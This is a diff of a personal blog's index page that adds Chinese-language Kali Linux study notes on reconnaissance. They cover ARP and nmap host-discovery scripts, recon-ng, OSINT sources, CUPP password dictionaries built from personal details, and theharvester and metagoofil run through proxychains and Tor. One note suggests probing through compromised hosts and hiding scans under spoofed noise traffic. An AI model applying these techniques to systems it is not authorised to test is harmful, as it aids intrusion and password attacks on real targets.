@@ -240,6 +240,904 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/%E4%BB%BB%E5%8A%A1024%EF%BC%9AKali%20Linux%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%8F%91%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/02/%E4%BB%BB%E5%8A%A1024%EF%BC%9AKali%20Linux%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%8F%91%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89/" itemprop="url">024：Kali Linux主动信息收集-发现（一）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-02T23:17:45+08:00">
+                2019-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<ol>
+<li><p>主动信息收集</p>
+<ul>
+<li>直接与目标系统交互通信</li>
+<li>无法避免留下访问的痕迹（可能被封杀，强的流量分析，强的代码审计）</li>
+<li>使用受控的第三方电脑进行探测<ul>
+<li>使用代理或已被控制的主机</li>
+<li>做好被封杀的准本</li>
+<li>使用噪声迷惑目标，淹没真实的探测流量（伪造IP发送大量垃圾信息）</li>
+</ul>
+</li>
+<li>扫描（IP层 → 端口层 → 服务级别的扫描）<ul>
+<li>发送不同的探测，根据结果判断目标状态</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>发现（IP层 → 端口层 → 服务级别的扫描）</p>
+<ul>
+<li>识别活着的主机<ul>
+<li>潜在的被攻击目标（存在的漏洞来进行利用）</li>
+</ul>
+</li>
+<li>输出一个IP地址列表（在线IP地址）</li>
+<li>2、3、4层发现</li>
+</ul>
+</li>
+<li><p>发现-二层发现（arping）</p>
+<ul>
+<li>优点：扫描速度快、可靠</li>
+<li>缺点：不可路由（只可发现本网段的主机发现）</li>
+<li>Arp协议<ul>
+<li>抓包</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>OSI模型
+Layer1 Physical
+Layer2 Data Link       ARP
+Layer3 Network         IPv4,IPv6,ICMP,and IPSec
+Layer4 Transport       TCP and UDP
+Layer5 Session         NetBIOS,PPTP,RPC,and SOCKS
+Layer6 Presentation    ASCII,JPEG,PDF,PNG,and DOCX
+Layer7 Application     HTTP,FTP,and Telnet</code></pre></blockquote>
+<ul>
+<li><strong><code>🔺命令：arping</code></strong></li>
+<li><strong><code>🔺命令：arping IP地址 -c 1</code></strong>（发送一个ARP包）</li>
+<li><strong><code>🔺命令：arping IP地址 -d</code></strong>（发现重复IP地址拥有一个MAC地址，可以发现arp地址欺骗）</li>
+<li><strong><code>🔺命令：arping -c 1 Ip地址 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></strong></li>
+<li>脚本 ▲2019.12.2新版ifconfig命令显示不同，对相应脚本进行修改<ul>
+<li><strong><code>🔺命令：./arping1.sh eth0 &gt;iplist.txt</code></strong>（检查网内”存活”的计算机）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [interface]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh eth0&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">interface=$1</span><br><span class="line">prefix=$(ifconfig $interface | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &apos;&#123;print $2&#125;&apos;)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>脚本 <ul>
+<li><strong><code>🔺命令：./arping2.sh iplist.txt</code></strong>（重新检查”存活”的主机）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [iplist.txt]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh iplist.txt&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">fi</span><br><span class="line">file=$1</span><br><span class="line">for addr in $(cat $file); do</span><br><span class="line">    arping -c 1 $addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>发现-二层发现（nmap）</p>
+<ul>
+<li><strong><code>🔺命令：nmap IP地址-254（IP地址/24） -sn</code></strong> </li>
+<li><strong><code>🔺命令：namp -iL（调用地址列表的文本文件） iplist.txt -sn | grep ^Namp</code></strong></li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>强大的NMAP软件，需要非常熟练
+nmap的-sn参数，除了会ARP发现之外，还会进行DNS的反向域名解析</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/30/%E4%BB%BB%E5%8A%A1023%EF%BC%9AKali%20Linux%20RECON-NG/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/30/%E4%BB%BB%E5%8A%A1023%EF%BC%9AKali%20Linux%20RECON-NG/" itemprop="url">023：Kali Linux RECON-NG</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-30T11:54:58+08:00">
+                2019-11-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<ol>
+<li><p>RECON-NG（▲2019.11.30需自行安装moudles）</p>
+<ul>
+<li><p>全特性的web侦擦框架（综合工具，模块去完成）</p>
+</li>
+<li><p>基于Python开发</p>
+</li>
+<li><p>Web信息搜索框架（通过google搜索引擎）</p>
+</li>
+<li><p>命令格式与msf一致（需熟练使用）</p>
+</li>
+<li><p>基于python开发</p>
+</li>
+<li><p>使用方法：</p>
+<ul>
+<li>模块（不同模块调用不同的搜索引擎，调用API接口）</li>
+<li>数据库</li>
+<li>报告</li>
+</ul>
+</li>
+<li><p>全局选项</p>
+<ul>
+<li>recon-ng （进入default模块）</li>
+<li>back（退回上一个模块）、exit（退出recon-ng）</li>
+<li>add（向数据库插入表）、del   ▲2019.11.30 集成于keys</li>
+<li>keys（framework API keys，搜索引擎的API）</li>
+<li>load（自己编写的模块可以load进来） ▲2019.11.30 集成于modules</li>
+<li>pdb（python的debug模式进行调试）</li>
+<li>query（查询数据库，跟上标准SQL语言） ▲2019.11.30 集成于db</li>
+<li>record（在recon-ng下的命令进行记录，-r参数进行调用） ▲2019.11.30 修改为script</li>
+<li>reload（修改模块后可以reload） ▲2019.11.30 集成于modules</li>
+<li>resourece（在框架下可以用-r调用recond文件）▲2019.11.30删除此模块</li>
+<li>search（seach相关的模块有哪些） ▲2019.11.30 集成于marketplace</li>
+<li>set（设置选项） ▲2019.11.30 集成于options</li>
+<li>shell（在框架下执行shell 命令）</li>
+<li>show（显示当前框架的各种信息）</li>
+<li>snapshots（快照）</li>
+<li>spool（资源池划分，也可以导出）</li>
+<li>unset（清楚设置） ▲2019.11.30 集成于options</li>
+<li>use（使用各种模块） ▲2019.11.30 删除此模块</li>
+<li>workspaces（管理工作区）</li>
+</ul>
+</li>
+<li><p>recon-ng -h</p>
+<ul>
+<li>-h（help选项）</li>
+<li>-v（version版本）</li>
+<li>-w（load/create a workspace）</li>
+<li>-r filename（workspace，创建一个工作区）</li>
+<li>–no-check（disable version check）</li>
+<li>–no-analytics（disable analytics reporting，不检查报告模块）</li>
+</ul>
+</li>
+<li><p>recon-ng -w（创建工作区） sina</p>
+</li>
+<li><p>workspaces list（查看工作区）</p>
+</li>
+<li><p>keys list（支持网站api）</p>
+</li>
+<li><p>keys add API类型 具体API</p>
+</li>
+<li><p>marketplace search google</p>
+</li>
+<li><p>shell ls</p>
+</li>
+<li><p>show options（当前可以option选项）</p>
+</li>
+<li><p>options set PROXY 127.0.0.1 8087（设置代理）</p>
+</li>
+<li><p>options set USER-AGETN “某一浏览器的字段”</p>
+</li>
+<li><p>unset USER-AGENT（清空设置）</p>
+</li>
+<li><p>snapshots take（作一次snapshots快照）</p>
+</li>
+<li><p>snapshots load（使用以前的快照）</p>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>recon-ng两下Tab键可以看到所有的命令
+全局模式下的options：DEBUG、NAMESERVER、PROXY、THREADS、TIMEOUT、USER-AGENT、VERBOSE
+DEBUG--python的debug调试
+NAMESERVER--域名解析服务器
+PROXY--代理 ▲2019.11.30代理暂无法使用
+THREADS--线程，搜索引擎有保护机制
+TIMEOUT--超时
+USER-AGENT--需要进行伪装，user-agent字段</code></pre></blockquote>
+<ul>
+<li><p>use 模块（harketarget模块可用）</p>
+<ul>
+<li>DNS查询</li>
+</ul>
+<ol>
+<li>Google</li>
+<li>Baidu</li>
+<li>Bing</li>
+<li>Yahoo</li>
+<li>Brute force</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p>   Google模式 ▲2019.11.30模块暂不可用</p>
+<ol>
+<li>marketplace search google</li>
+<li>modules load recon/domains-hosts/google_site_web（也可以使用api）</li>
+<li>show options</li>
+<li>show info</li>
+<li>options set SOURCE 域名</li>
+<li>run</li>
+<li>show hosts/query select * from hosts</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>   bing模式 ▲2019.11.30模块暂不可用</p>
+<ol>
+<li>marketplace search bing</li>
+<li>modules load recon/domains-hosts/bing_site_web</li>
+<li>show options</li>
+<li>options set SOURCE 域名</li>
+<li>run</li>
+<li>query select * from hosts where host like ‘%www%’（复杂sql查询）</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>   brute模式（不解析IP地址）</p>
+<ol>
+<li>marketplace search brute</li>
+<li>modules load recon/domains-hosts/brute_hosts</li>
+<li>show options</li>
+<li>options set SOURCE/WORDLIST  </li>
+<li>run</li>
+</ol>
+</blockquote>
+<ul>
+<li>use 模块（harketarget模块可用）<ul>
+<li>解析IP地址（查询数据库，存在负载均衡）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ol>
+<li>marketplace search resolve</li>
+<li>modules load recon/hosts-hosts/resolve</li>
+<li>show options</li>
+<li>show info</li>
+<li>options set SOURCE query select host from hosts where host like ‘%sina.com.cn%’</li>
+<li>show hosts</li>
+<li>options set SOURCE query select host from hosts</li>
+<li>show hosts</li>
+</ol>
+</blockquote>
+<ul>
+<li>use 模块（harketarget模块可用）<ul>
+<li>联系人</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ol>
+<li>marketplace search contact</li>
+</ol>
+</blockquote>
+<ul>
+<li>use 模块（harketarget模块可用）<ul>
+<li>报告</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ol>
+<li>marketplace search report</li>
+<li>modules load reporting/html</li>
+<li>show options</li>
+<li>options set CREATOR 创建者</li>
+<li>options set CUSTOMER 客户</li>
+<li>options set FILENAME 路径</li>
+<li>options set SANITIZE TRUE（是否对私密消息进行mask）</li>
+</ol>
+</blockquote>
+<ul>
+<li>use 模块（harketarget模块可用）<ul>
+<li>API</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/%E4%BB%BB%E5%8A%A1022%EF%BC%9AKali%20Linux%E5%85%B6%E4%BB%96%E9%80%94%E5%BE%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/29/%E4%BB%BB%E5%8A%A1022%EF%BC%9AKali%20Linux%E5%85%B6%E4%BB%96%E9%80%94%E5%BE%84/" itemprop="url">022：Kali Linux其他途径</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-29T13:27:49+08:00">
+                2019-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<ol>
+<li><p>其他途径</p>
+<ul>
+<li>社交网络</li>
+<li>工商注册（法人、公司规模）</li>
+<li>新闻组/论坛</li>
+<li>招聘网站</li>
+<li><a href="https://archive.org/web/" target="_blank" rel="noopener">https://archive.org/web/</a></li>
+</ul>
+</li>
+<li><p>个人专属的密码字典</p>
+<ul>
+<li>按个人信息生成其专属的密码字典</li>
+<li>CUPP–Common User Password Profiler<ul>
+<li><strong><code>🔺命令：git clone https://github.com/Mebus/cupp.git</code></strong></li>
+<li><strong><code>🔺命令：python3 cupp.py -i</code></strong></li>
+<li>进行简单的信息输入</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>METADATA</p>
+<ul>
+<li>Exif图片信息（图片记录GPS，照片生成时的信息）▲2019.11.29需要安装</li>
+<li>Foca ▲2019.11.29未实验</li>
+<li><strong><code>🔺命令：exiftool +图片.jpg</code></strong></li>
+</ul>
+</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/%E4%BB%BB%E5%8A%A1021%EF%BC%9AKali%20Linux%20Google%E6%90%9C%E7%B4%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/29/%E4%BB%BB%E5%8A%A1021%EF%BC%9AKali%20Linux%20Google%E6%90%9C%E7%B4%A2/" itemprop="url">021：Kali Linux Google搜索</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-29T13:27:49+08:00">
+                2019-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<ol>
+<li><p>YANDEX</p>
+<ul>
+<li>世界第四大搜索引擎–俄罗斯</li>
+<li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li>
+</ul>
+</li>
+<li><p>用户信息</p>
+<ul>
+<li>邮件、主机（▲2019.11.29theharvester commond not found）<ul>
+<li><strong><code>🔺命令：theharvester -d 域名 -l（并发限制搜索结果数量） 300 -b 搜索引擎</code></strong></li>
+<li><strong><code>🔺命令：vi /etc/proxychains</code></strong></li>
+<li><strong><code>🔺命令：socks tor的监听端口（按照proxychains配置）</code></strong></li>
+<li><strong><code>🔺命令：proxychains theharvester -d 域名 -l（并发限制搜索结果数量） 300 -b 搜索引擎</code></strong></li>
+</ul>
+</li>
+<li>文件<ul>
+<li><strong><code>🔺命令：metagoofil（google搜索） -d 域名 -t（文件类型） pdf -l（并发限制搜索结果数量） 200 -o （工作目录）test -f（输出文件） 1.html</code></strong></li>
+<li><strong><code>🔺命令：proxychains metagoofil（google搜索） -d 域名 -t（文件类型） pdf -l（并发限制搜索结果数量） 200 -o （工作目录）test -f（输出文件） 1.html</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>tmux终端窗口的复用器，划分窗口大小 ▲2019.11.29未实验
+tor可进行代理翻墙</code></pre></blockquote>
+<ol start="3">
+<li><p>MELTAGO</p>
+<ul>
+<li>申请账号</li>
+<li>登陆使用</li>
+</ul>
+</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/28/%E4%BB%BB%E5%8A%A1020%EF%BC%9AKali%20Linux%20SHODAN/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1365,773 +2263,6 @@ Hidden Truecrypt volume:存在outer volume和Hidden volume</code></pre></blockqu
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/26/%E4%BB%BB%E5%8A%A1014%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1%E3%80%81%E5%AE%9E%E8%B7%B5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/26/%E4%BB%BB%E5%8A%A1014%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1%E3%80%81%E5%AE%9E%E8%B7%B5/" itemprop="url">014：Kali Linux基本工具-WIRESHARK信息统计、实践</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-26T20:20:19+08:00">
-                2019-11-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<ol>
-<li><p>WIRESHARK-信息统计（Statistics、Analyze）</p>
-<ul>
-<li>节点数–Summary摘要信息、Endpoints包的总数统计 ▲2019.11.26Summary改版为Capture File Properties</li>
-<li>协议分析–Protocol Hierarchy当前数据包的协议类型（DNS占比不大）</li>
-<li>包大小分布–Packet Lengths包的长度（小包占比大说明网络性能不好）</li>
-<li>会话连接–Conversations机器间的会话（若少量会话占用程序，说明僵尸网络在发包）</li>
-<li>解码方式–Decode AS解析成自定义协议</li>
-<li>专家系统–Expert info软件自带分析 ▲2019.11.26Expert info改版为Expert information</li>
-</ul>
-</li>
-<li><p>WIRESHARK-实践</p>
-<ul>
-<li><p>抓包对比nc、ncat加密与不加密的流量</p>
-<ul>
-<li>nc传输（明文传输）</li>
-</ul>
-<ol>
-<li>ARP</li>
-<li>TCP三次握手</li>
-<li>反向ARP</li>
-<li>开始TCP传输数据</li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>follow TCP stream为明文传输</code></pre></blockquote>
-<ul>
-<li><p>抓包对比nc、ncat加密与不加密的流量  </p>
-<ul>
-<li>ncat传输（密文传输）</li>
-</ul>
-<ol>
-<li>ARP</li>
-<li>TCP三次握手</li>
-<li>反向ARP</li>
-<li>开始TCP传输数据</li>
-</ol>
-</li>
-</ul>
-<blockquote>
-<pre><code>follow TCP stream为密文传输，一些Ncat特征为明文传输</code></pre></blockquote>
-<ul>
-<li>企业抓包部署方案（镜像端口 → 全流量，多块网卡捆绑，被动式扫描）<ul>
-<li>Sniffer</li>
-<li>Cace/riverbed（建立索引，易于大文件分析）</li>
-<li>Cascad pilot</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/26/%E4%BB%BB%E5%8A%A1013%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%8C%85%E3%80%81WIRESHARK-TCP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/26/%E4%BB%BB%E5%8A%A1013%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%8C%85%E3%80%81WIRESHARK-TCP/" itemprop="url">013：Kali Linux基本工具-常见协议包、WIRESHARK-TCP</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-26T07:41:13+08:00">
-                2019-11-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<ol>
